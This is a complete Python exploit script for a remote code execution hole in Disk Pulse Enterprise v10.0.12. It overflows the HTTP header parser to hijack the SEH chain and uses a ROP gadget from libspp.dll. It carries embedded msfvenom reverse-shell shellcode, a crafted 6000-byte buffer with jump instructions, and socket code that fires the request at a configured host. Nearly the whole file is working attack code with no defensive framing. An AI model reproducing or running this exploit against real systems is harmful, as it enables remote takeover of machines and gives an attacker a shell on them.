#!/usr/bin/python
import socket
from pwn import *

"""
NOTES
RCE for Disk Pulse Enterprise v10.0.12

Callstack
----------------------
SEH handler
ntdll!ExecuteHandler2+0x26
ntdll!ExecuteHandler+0x24
ntdll!KiUserExceptionDispatcher+0x26
libspp!SCA_HttpParser::ParseHttpHeader+0xdd

ROP
------------------
libpal.dll 0xb10000
libmon.dll 0xbf0000
diskpls.exe 0x400000
libspp.dll 0x10000000 <-----


101286ac libspp!SPP_ValueTrend::FormatValueString+0x5a8c
pop     esi
pop     ebx
ret
"""

# Config - Disk Pulse server
host = "127.0.0.1"
port = 80

# Function
def send_exploit_request():
    # Shellcode
    #  msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f python -b "\x00\x0d\x0a\x09\x20\x2f\x2e" -v shellcode
    shellcode =  b""
    shellcode += b"\xd9\xcc\xd9\x74\x24\xf4\x5a\xb8\xd4\xa2\x86"
    shellcode += b"\xec\x31\xc9\xb1\x52\x31\x42\x17\x83\xea\xfc"
    shellcode += b"\x03\x96\xb1\x64\x19\xea\x5e\xea\xe2\x12\x9f"
    shellcode += b"\x8b\x6b\xf7\xae\x8b\x08\x7c\x80\x3b\x5a\xd0"
    shellcode += b"\x2d\xb7\x0e\xc0\xa6\xb5\x86\xe7\x0f\x73\xf1"
    shellcode += b"\xc6\x90\x28\xc1\x49\x13\x33\x16\xa9\x2a\xfc"
    shellcode += b"\x6b\xa8\x6b\xe1\x86\xf8\x24\x6d\x34\xec\x41"
    shellcode += b"\x3b\x85\x87\x1a\xad\x8d\x74\xea\xcc\xbc\x2b"
    shellcode += b"\x60\x97\x1e\xca\xa5\xa3\x16\xd4\xaa\x8e\xe1"
    shellcode += b"\x6f\x18\x64\xf0\xb9\x50\x85\x5f\x84\x5c\x74"
    shellcode += b"\xa1\xc1\x5b\x67\xd4\x3b\x98\x1a\xef\xf8\xe2"
    shellcode += b"\xc0\x7a\x1a\x44\x82\xdd\xc6\x74\x47\xbb\x8d"
    shellcode += b"\x7b\x2c\xcf\xc9\x9f\xb3\x1c\x62\x9b\x38\xa3"
    shellcode += b"\xa4\x2d\x7a\x80\x60\x75\xd8\xa9\x31\xd3\x8f"
    shellcode += b"\xd6\x21\xbc\x70\x73\x2a\x51\x64\x0e\x71\x3e"
    shellcode += b"\x49\x23\x89\xbe\xc5\x34\xfa\x8c\x4a\xef\x94"
    shellcode += b"\xbc\x03\x29\x63\xc2\x39\x8d\xfb\x3d\xc2\xee"
    shellcode += b"\xd2\xf9\x96\xbe\x4c\x2b\x97\x54\x8c\xd4\x42"
    shellcode += b"\xfa\xdc\x7a\x3d\xbb\x8c\x3a\xed\x53\xc6\xb4"
    shellcode += b"\xd2\x44\xe9\x1e\x7b\xee\x10\xc9\xfb\xef\x1a"
    shellcode += b"\x08\x6c\xf2\x1a\x1b\x30\x7b\xfc\x71\xd8\x2d"
    shellcode += b"\x57\xee\x41\x74\x23\x8f\x8e\xa2\x4e\x8f\x05"
    shellcode += b"\x41\xaf\x5e\xee\x2c\xa3\x37\x1e\x7b\x99\x9e"
    shellcode += b"\x21\x51\xb5\x7d\xb3\x3e\x45\x0b\xa8\xe8\x12"
    shellcode += b"\x5c\x1e\xe1\xf6\x70\x39\x5b\xe4\x88\xdf\xa4"
    shellcode += b"\xac\x56\x1c\x2a\x2d\x1a\x18\x08\x3d\xe2\xa1"
    shellcode += b"\x14\x69\xba\xf7\xc2\xc7\x7c\xae\xa4\xb1\xd6"
    shellcode += b"\x1d\x6f\x55\xae\x6d\xb0\x23\xaf\xbb\x46\xcb"
    shellcode += b"\x1e\x12\x1f\xf4\xaf\xf2\x97\x8d\xcd\x62\x57"
    shellcode += b"\x44\x56\x82\xba\x4c\xa3\x2b\x63\x05\x0e\x36"
    shellcode += b"\x94\xf0\x4d\x4f\x17\xf0\x2d\xb4\x07\x71\x2b"
    shellcode += b"\xf0\x8f\x6a\x41\x69\x7a\x8c\xf6\x8a\xaf"

    # Buffer
    buffer = flat({
        2100: shellcode,
        2495: b"\xEB\x06", # jmp short 8
        2499: p32(0x101286ac),
        2503: b"\xe9\x05\xfe\xff\xff" # jmp near -500
    }, length=6000, filler=b"\x90")
    

    #HTTP Request
    request = b"GET /" + buffer + b"HTTP/1.1" + b"\r\n"
    request += b"Host: " + host.encode("utf-8") + b"\r\n"
    request += b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0\r\n"
    request += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    request += b"Accept-Language: en-US,en;q=0.5\r\n"
    request += b"Accept-Encoding: gzip, deflate\r\n"
    request += b"Connection: keep-alive\r\n\r\n"
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(request)
    s.close()

    print(f"{len(buffer)} bytes payload sent")

if __name__ == "__main__": 
    send_exploit_request()
